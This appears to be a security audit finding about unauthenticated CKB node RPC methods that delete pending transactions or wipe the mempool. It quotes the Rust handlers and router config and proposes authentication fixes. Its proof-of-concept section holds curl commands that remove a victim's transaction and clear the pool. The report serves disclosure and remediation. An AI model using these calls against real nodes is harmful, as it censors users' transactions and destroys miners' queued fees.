### Title
Unauthenticated `remove_transaction` and `clear_tx_pool` RPC Methods Allow Any Reachable Caller to Delete Pending Transactions from the Mempool - (File: `rpc/src/module/pool.rs`)

---

### Summary

The `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` RPC methods in the `Pool` module perform destructive, irreversible operations on the transaction pool without any authentication or authorization check. The RPC server has no authentication middleware of any kind. The `Pool` module is enabled by default. Any HTTP client that can reach the RPC endpoint — including any process on the same host, or any remote client if the operator has bound the RPC to a non-loopback address — can silently delete any or all pending transactions from the mempool. This is the direct CKB analog of the reported `onAfterRemoveLiquidity` missing `onlyVault` modifier: a privileged, state-deleting function callable by any unprivileged actor who can reach the entry point.

---

### Finding Description

**Root cause — no caller authentication on destructive RPC methods:**

`remove_transaction` in `rpc/src/module/pool.rs` removes a target transaction and all its descendants from the pool with zero caller verification:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| { ... })
}
```

`clear_tx_pool` wipes the entire mempool:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.clear_pool(snapshot).map_err(|err| ...)?;
    Ok(())
}
```

`clear_tx_verify_queue` empties the verification queue:

```rust
fn clear_tx_verify_queue(&self) -> Result<()> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.clear_verify_queue().map_err(|err| ...)?;
    Ok(())
}
```

**No authentication middleware in the RPC server:**

`rpc/src/server.rs` builds the Axum router with `CorsLayer::permissive()` (accepts all origins) and no authentication layer:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← no auth, all origins accepted
    .layer(TimeoutLayer::with_status_code(...))
    .layer(Extension(stream_config));
```

**Pool module enabled by default:**

The production config enables the `Pool` module (which includes all three methods) by default:

```toml
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
```

**Exploit path:**

```
[Attacker HTTP client]
    --> POST http://<node>:8114
    --> {"method": "remove_transaction", "params": ["<victim_tx_hash>"]}
    --> PoolRpcImpl::remove_transaction()  (no auth check)
    --> TxPoolController::remove_local_tx()
    --> TxPool::remove_tx()  (deletes tx + all descendants)
```

The same path applies to `clear_tx_pool` to wipe the entire mempool in one call.

---

### Impact Explanation

- **Transaction censorship**: An attacker who knows a victim's transaction hash (observable from the public mempool via `get_raw_tx_pool`) can silently remove it before it is mined. The victim's transaction disappears without error; the victim must resubmit and pay fees again.
- **Full mempool wipe**: `clear_tx_pool` removes every pending transaction in one unauthenticated call. All users with pending transactions lose them simultaneously. Miners lose all queued fee revenue.
- **Verification queue disruption**: `clear_tx_verify_queue` drops all transactions currently being verified, stalling the pipeline.
- **No recovery signal**: The deletion is silent. Affected users receive no notification; their wallets still show the transaction as submitted until they query the node.

---

### Likelihood Explanation

- The RPC default binding is `127.0.0.1:8114`, but the software imposes no code-level enforcement. Operators routinely rebind to `0.0.0.0` for remote management — a common real-world deployment pattern — making the endpoint reachable from the internet with no further precondition.
- Even with localhost binding, any process co-located on the node host (a compromised web service, a malicious dependency, a script) can issue the HTTP call with no credentials.
- `CorsLayer::permissive()` means a browser-based SSRF or cross-origin script can also reach the endpoint if the host is reachable.
- Transaction hashes are public (visible via `get_raw_tx_pool`), so the attacker needs no insider knowledge to target a specific victim transaction.
- No rate limiting, no IP allowlist, no token — the attacker needs only a single HTTP POST.

---

### Recommendation

1. **Implement token-based authentication** for all state-mutating Pool RPC methods. Generate a random secret at node startup, write it to a local file readable only by the node process owner, and require it as a bearer token or HTTP header on every call to `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue`.

2. **Separate destructive admin methods** into a distinct RPC module (e.g., `Admin`) that is disabled by default and, when enabled, binds to a separate listen address with mandatory authentication.

3. **Add an IP allowlist check at the handler level** as defense-in-depth, so that even if the network binding is misconfigured, the handler rejects requests from non-allowlisted sources.

### Proof of Concept

**Prerequisites**: CKB node running with default config (`Pool` module enabled, RPC on `127.0.0.1:8114`). No credentials, no special access.

**Step 1 — Observe victim's pending transaction:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# Returns list of all pending tx hashes — public, no auth required
```

**Step 2 — Remove victim's transaction (no authentication):**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"id":2,"jsonrpc":"2.0","method":"remove_transaction","params":["<victim_tx_hash>"]}'
# Returns: {"result": true}  — transaction deleted, no auth check performed
```

**Step 3 — Confirm deletion:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"id":3,"jsonrpc":"2.0","method":"get_transaction","params":["<victim_tx_hash>"]}'
# Returns: transaction status "unknown" — victim's tx is gone
```

**Step 4 — Wipe entire mempool (escalated impact):**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"id":4,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Returns: {"result": null}  — all pending transactions deleted
```
